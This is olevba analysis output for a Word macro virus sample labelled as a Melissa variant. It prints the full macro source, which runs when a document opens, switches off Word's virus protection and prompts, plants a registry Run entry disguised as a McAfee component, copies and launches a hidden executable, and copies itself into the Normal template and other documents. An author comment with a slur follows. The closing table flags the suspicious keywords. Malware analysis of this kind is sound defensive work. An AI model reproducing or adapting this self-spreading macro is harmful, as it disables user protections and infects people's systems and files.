olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.x-ef5bce9bf34391c717f2cd55d79df77d3206fc16
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO money99.cls 
in file: Virus.MSWord.Melissa.x-ef5bce9bf34391c717f2cd55d79df77d3206fc16 - OLE stream: 'Macros/VBA/money99'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Dim source, dest

CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)

If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Mcafee VShield") <> "c:\windows\system\vshield.exe" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Mcafee VShield") = "c:\windows\system\vshield.exe"

source = "a:\msdos.bak"
dest = "c:\windows\system\vshield.exe"
FileCopy source, dest
SetAttr dest, vbHidden
Shell dest

Else

source = "c:\windows\system\vshield.exe"
dest = "a:\msdos.bak"
FileCopy source, dest
SetAttr dest, vbHidden
End If

Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)

NTlnCnt = NT.CodeModule.CountOfLines
ADlnCnt = AD.CodeModule.CountOfLines
Start = 1

If NT.Name <> "money99" Then
    If NTlnCnt > 0 Then NT.CodeModule.DeleteLines 1, NTlnCnt
    NT.Name = "money99"
    
    Do While AD.CodeModule.Lines(Start, 1) <> "'Done"
        NT.CodeModule.InsertLines Start, AD.CodeModule.Lines(Start, 1)
        Start = Start + 1
    Loop
    NT.CodeModule.InsertLines NT.CodeModule.CountOfLines + 1, "'Done"
    
ElseIf AD.Name <> "money99" Then
    If ADlnCnt > 0 Then AD.CodeModule.DeleteLines 1, ADlnCnt
    AD.Name = "money99"
    
    Do While NT.CodeModule.Lines(Start, 1) <> "'Done"
        AD.CodeModule.InsertLines Start, NT.CodeModule.Lines(Start, 1)
        Start = Start + 1
    Loop
    AD.CodeModule.InsertLines AD.CodeModule.CountOfLines + 1, "'Done"
End If

End Sub
'Mcafee blows; mail suggestions/improvements to anon15773@hushmail.com
'Shout out to ma nigga Sketch
'Done
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |vshield.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

